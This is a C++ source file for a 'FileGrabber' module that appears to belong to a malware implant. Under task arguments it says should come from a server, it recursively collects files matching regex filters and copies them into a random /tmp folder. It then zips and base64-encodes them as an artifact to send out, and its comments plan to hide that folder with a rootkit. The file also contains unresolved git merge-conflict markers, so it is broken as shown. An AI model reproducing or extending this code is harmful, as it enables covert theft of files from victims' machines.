#include <boost/filesystem.hpp>
#include <boost/system/system_error.hpp>
#include "../include/json.hpp"
#include <iostream>
#include <regex>
#include <vector>
#include <string>
#include <fstream>
#include <random>
#include "FileGrabber.h"
<<<<<<< HEAD
#include "../Utils/CryptoUtils.h"
#include "../Utils/MachineUtils.h"
=======
>>>>>>> 0a525aac6cf25fc80044469ea9b1a7edfccaaf57

// TODO: implement all the functions in the header.

void FileGrabber::module_impl()
{
<<<<<<< HEAD
    // We only want to run once

    run_ = false;

    std::cout << "Running" << module_type << " with args: " << args.dump() << std::endl;

    const std::string base_dir = "/tmp/";
    std::string zip_file_name = "out.zip";
    std::string working_dir;

    try 
    {
        working_dir = create_working_dir(base_dir);
        //TODO: hide the working_dir using rootkit
        std::cout << "Successfully created directory: " << working_dir << std::endl;
    } 
    catch (const std::exception& ex) 
    {
        std::cerr << "Error: " << ex.what() << std::endl;
    }

    //TODO: we should get this configuration from the server

    int total_grabbed_files = parse_tasks(working_dir, args);
    
    std::cout << "Grabbed files: " << total_grabbed_files <<std::endl;

    // zipping the working_dir
    std::string out_zip_path = working_dir + '/' + zip_file_name;
    if (total_grabbed_files) {
        if (zip_folder(working_dir, out_zip_path)) {
            // std::cout << "Zipping successful!: " << out_zip_path << std::endl;
        } else {
            std::cout << "Zipping failed!" << std::endl;
        }
    }

    if (boost::filesystem::exists(out_zip_path)) 
    {
        std::cout << "File exists: " << out_zip_path << std::endl;
        std::vector<unsigned char> fileContent = readFile(out_zip_path);
        std::string base64Content = CryptoUtils::base64_encode(fileContent);
        nlohmann::json ret_json;
        ret_json[module_type] = base64Content;

        // TODO: send zip file to server
        save_artifact(ret_json);
        
        // std::ofstream outFile("grabbed.json");
        // outFile << ret_json.dump(4);
        // outFile.close();
        // std::cout << "File has been encoded and saved to grabbed.json" << std::endl;

    }
    else 
    {
        // TODO: send indecation that we didnt find any file
        std::cout << "File does not exist: " << out_zip_path << std::endl;
    }

    //TODO: delete folder from fs
    //      How can we do it after we hide it?

    return;
}

std::vector<unsigned char> FileGrabber::readFile(const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary);
    std::vector<unsigned char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    return buffer;
}


std::vector<std::string> FileGrabber::list_files(const std::string working_dir, const std::string& root, const bool& recursive, const std::string& filter, const bool& regularFilesOnly)
{
    namespace fs = boost::filesystem;
    fs::path rootPath(root);

    // Throw exception if path doesn't exist or isn't a directory.
    if (!fs::exists(rootPath)) {
        throw std::runtime_error(root + " does not exist");
    }
    if (!fs::is_directory(rootPath)) {
        throw std::runtime_error(root + " is not a directory.");
    }

    // List all the files in the directory
    const std::regex regexFilter(filter);
    auto fileList = std::vector<std::string>();
    
    if (root.compare(working_dir) == 0) {
        return fileList;
    }

    fs::directory_iterator end_itr;
    for( fs::directory_iterator it(rootPath); it != end_itr; ++it) {
        std::string filepath(it->path().string());

        // For a directory
        if (fs::is_directory(it->status())) {

            if (recursive && it->path().string() != "..") {
                // List the files in the directory
                auto currentDirFiles = list_files(working_dir, filepath, recursive, filter, regularFilesOnly);
                // Add to the end of the current vector
                fileList.insert(fileList.end(), currentDirFiles.begin(), currentDirFiles.end());
            }

        } else if (fs::is_regular_file(it->status())) { // For a regular file
            if (filter != "" && !regex_match(filepath, regexFilter)) {
                continue;
            }

        }

        if (regularFilesOnly && !fs::is_regular_file(it->status())) {
            continue;
        }

        // Add the file or directory to the list
        fileList.push_back(filepath);
    }

    return fileList;
}

std::string FileGrabber::create_working_dir(std::string base_dir) {
    std::string random_dir_name;
    boost::filesystem::path dir_path;

    do {
        random_dir_name = MachineUtils::generate_random_string(10); // Generate a random string of length 10
        dir_path = base_dir + random_dir_name;
    } while (boost::filesystem::exists(dir_path)); // Ensure the directory does not already exist

    if (boost::filesystem::create_directory(dir_path)) {
        // std::cout << "Directory created: " << dir_path.string() << std::endl;
        return dir_path.string();
    } else {
        throw std::runtime_error("Failed to create directory.");
    }
}


// Function to replace slashes in the file path with underscores
std::string FileGrabber::replace_slashes_with_underscores(const std::string& path) {
    std::string modified_path = path;

    for (char& ch : modified_path) {
        if (ch == '/' || ch == '\\') {
            ch = '_';
        }
    }

    return modified_path;
}

void FileGrabber::copy_file_to_folder(const std::string& source_path, const std::string& destination_folder) {
    try {
        boost::filesystem::path source(source_path);
        boost::filesystem::path destination(destination_folder);

        // Ensure the destination is a directory
        if (!boost::filesystem::is_directory(destination)) {
            std::cerr << "Destination is not a directory." << std::endl;
            return;
        }

        // Replace slashes with underscores in the source path
        std::string modified_filename = replace_slashes_with_underscores(source.string());

        // Create the destination path by appending the modified filename
        boost::filesystem::path destination_file = destination / modified_filename;

        // Copy the file from source to destination without overwriting
        if (!boost::filesystem::exists(destination_file)) {
            boost::filesystem::copy_file(source, destination_file);
            // std::cout << "File copied successfully from " << source_path << " to " << destination_file.string() << std::endl;
        } else {
            std::cerr << "File already exists: " << destination_file.string() << std::endl;
        }
    } catch (const boost::filesystem::filesystem_error& ex) {
        std::cerr << "Error: " << ex.what() << std::endl;
    }
}


bool FileGrabber::zip_file(zipFile zf, const std::string& file_path, const std::string& zip_entry_name) {
    zip_fileinfo zip_info = {0};

    int err = zipOpenNewFileInZip(zf, zip_entry_name.c_str(), &zip_info, nullptr, 0, nullptr, 0, nullptr, Z_DEFLATED, Z_DEFAULT_COMPRESSION);
    if (err != ZIP_OK) {
        std::cerr << "Could not open file in zip: " << zip_entry_name << std::endl;
        return false;
    }

    std::ifstream file(file_path, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Could not open source file: " << file_path << std::endl;
        zipCloseFileInZip(zf);
        return false;
    }

    const size_t buffer_size = 4096;
    char buffer[buffer_size];
    while (file.read(buffer, buffer_size)) {
        zipWriteInFileInZip(zf, buffer, file.gcount());
    }
    if (file.gcount() > 0) {
        zipWriteInFileInZip(zf, buffer, file.gcount());
    }

    file.close();
    zipCloseFileInZip(zf);
    return true;
}


bool FileGrabber::zip_folder(const std::string& folder_path, const std::string& zip_file_path) {
    zipFile zf = zipOpen(zip_file_path.c_str(), APPEND_STATUS_CREATE);
    if (zf == nullptr) {
        std::cerr << "Could not create zip file: " << zip_file_path << std::endl;
        return false;
    }

    boost::filesystem::path folder(folder_path);

    // Recursively iterate through the directory
    for (boost::filesystem::recursive_directory_iterator end, dir(folder); dir != end; ++dir) {
        if (boost::filesystem::is_regular_file(*dir)) {
            std::string file_path = dir->path().string();
            std::string zip_entry_name = boost::filesystem::relative(dir->path(), folder).string();

            if (!zip_file(zf, file_path, zip_entry_name)) {
                zipClose(zf, nullptr);
                return false;
            }
        } else if (boost::filesystem::is_directory(*dir)) {
            // Handle directories by creating empty directory entries in the zip file
            std::string zip_entry_name = boost::filesystem::relative(dir->path(), folder).string() + "/";  // Add trailing slash to mark as directory
            zip_fileinfo zip_info = {0};
            zipOpenNewFileInZip(zf, zip_entry_name.c_str(), &zip_info, nullptr, 0, nullptr, 0, nullptr, Z_DEFLATED, Z_DEFAULT_COMPRESSION);
            zipCloseFileInZip(zf);
        }
    }

    zipClose(zf, nullptr);
    std::cout << "Folder zipped successfully: " << zip_file_path << std::endl;
    return true;
}


int FileGrabber::run_grab_task(std::string working_dir, std::string directory, std::string filter, std::string task_id) {
    int found_counter = 0;
    
    std::string task_dir = working_dir + '/' + task_id;
    try {
        boost::filesystem::create_directory(task_dir);
    } catch (const boost::filesystem::filesystem_error& ex) {
        std::cerr << "Error: " << ex.what() << std::endl;
    }
    
    std::vector<std::string> files;
    try {
        files = list_files(working_dir, directory, true, filter, true);
    } catch (const std::exception& ex) {
        std::cerr << "Error: " << ex.what() << std::endl;
    }
    // std::cout << "Files found:" << std::endl;
    for (const auto& file : files) {
        // std::cout << file << std::endl;
        //copy those files to task_dir
        copy_file_to_folder(file, task_dir);
        found_counter++;
    }
    return found_counter;
}


int FileGrabber::parse_tasks(std::string working_dir, nlohmann::json j) {
    int c = 0;

    // Iterate through the JSON object
    for (auto& [task_id, value] : j.items()) {
        std::string start_path = value["start_path"];  // Get start_path as string
        std::vector<std::string> files = value["files"];  // Get files as vector of strings

        for (const auto& filter : files) {
            // std::cout << filter << " ";
            c += run_grab_task(working_dir, start_path, filter, task_id);
        }
    }
    return c;
=======
    std::cout << args.dump() << std::endl;
>>>>>>> 0a525aac6cf25fc80044469ea9b1a7edfccaaf57
}